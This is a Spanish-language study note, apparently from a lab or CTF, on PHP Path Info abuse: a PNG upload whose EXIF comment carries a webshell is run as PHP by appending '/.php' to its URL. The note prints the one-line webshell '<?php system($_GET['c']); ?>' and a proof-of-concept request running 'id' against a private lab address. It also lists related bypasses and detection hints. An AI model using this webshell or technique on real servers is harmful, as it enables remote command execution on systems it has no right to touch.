## Cosas a tener en cuenta para que funcione:

1.Subida de ficheros :
Sin validación de MIME --> no verifica que sea .png
No modifica metadatos --> para poder meter PHP en los metadatos

2.Poder apuntar a una imagen en el servidor
3.Path Info Abuse --> Añades `/.php` a la URL, el servidor lo interpreta erróneamente

##  ¿Qué hace exactamente la vulnerabilidad de **Path Info**?

🔧 Concepto técnico:

**Path Info** es una funcionalidad del servidor web (como Apache o Nginx con PHP) que permite **añadir datos adicionales al final de la URL**, _después del nombre del archivo_, sin que eso rompa la solicitud.

Por ejemplo:

http

CopiarEditar

`/script.php/cualquier/cosa?param=1`

Aquí, PHP ejecuta `script.php`, y lo que va después (`/cualquier/cosa`) queda accesible desde `$_SERVER['PATH_INFO']`.

---

🛠️ ¿Dónde está el problema?

En un servidor mal configurado, si haces esto:

http

CopiarEditar

`/uploads/hacker.png/.php`

El servidor:

1. **Ignora que el archivo se llama `hacker.png`**
    
2. **Ve la extensión falsa `/.php` al final**
    
3. Lo trata como si fuese un archivo PHP
    

🔁 Entonces: **interpreta el contenido del `.png` como si fuese código PHP**, aunque sea una imagen, **y ejecuta lo que encuentre** (por ejemplo, código PHP en los metadatos).
## Posibles ataques:
### ✅ 1. **Bypass de filtros de extensiones**

Si una app no permite subir `.php`, pero sí `.png`, puedes:

- Subir un archivo `.png` con código PHP embebido
    
- Acceder con `/.php` al final y ejecutarlo
    

---

### ✅ 2. **Evasión de reglas WAF o IPS**

Algunos sistemas no detectan `hacker.png/.php` como archivo PHP y no bloquean la solicitud.

---

### ✅ 3. **RCE (Remote Code Execution)**

Como en tu caso, si puedes inyectar una webshell en un archivo accesible y ejecutar vía Path Info, logras ejecución de comandos directamente.

---

### ✅ 4. **LFI + Path Info**

Si una ruta local vulnerable a LFI permite algo como:

php

CopiarEditar

`include($_GET['file']);`

Y haces:

http

CopiarEditar

`vuln.php?file=uploads/hacker.png/.php`

Puedes conseguir ejecución si el archivo contiene PHP.

---

### ✅ 5. **Index.php Routing Abuse**

En frameworks como Laravel, Symfony o CodeIgniter, todo pasa por `index.php` usando Path Info. Puedes inyectar rutas maliciosas para:

- Ejecutar controladores no autorizados
    
- Romper lógica de seguridad


## Como darte cuenta:
### ✅ 1. **Metadatos con código PHP**

Al hacer:

bash

CopiarEditar

`exiftool hacker.png`

Y ver esto:

php

CopiarEditar

`Comment: <?php system($_GET['c']); ?>`

Eso **ya huele a webshell**. Claramente, alguien espera que esto **se ejecute**, no solo se guarde.

⛳ Esto debería hacerte pensar: “¿Dónde y cómo podría PHP ejecutar esto?”

---

### ✅ 2. **El archivo subido es accesible públicamente**

Puedes ver el archivo en:

bash

CopiarEditar

`http://10.0.2.13/admin/uploads/hacker.png`

➡️ Eso te dice: “el archivo está en una carpeta expuesta del servidor”.

---

### ✅ 3. **El archivo se comporta raro si le agregas cosas en la URL**

Aquí es donde entra Path Info:

Si accedes a:

bash

CopiarEditar

`/uploads/hacker.png/.php?c=id`

Y ves que **el servidor responde diferente** (por ejemplo, ejecuta comandos en lugar de mostrar una imagen), entonces algo raro está pasando.


## PoC

Web con imágenes:
![[Pasted image 20250724221051.png]]

Vemos que tiene de metadatos como una especie de webshell
![[Pasted image 20250724222338.png]]

Podemos apuntar a la imagen sin restricciones

Añadimos el Path Info con "/.php" y ejecutamos el código de dentro de los metadatos:

```
http://10.0.2.13/admin/uploads/hacker.png/.php?c=id
```

![[Pasted image 20250724222604.png]]

Y ahí tendríamos la ejecución de comandos.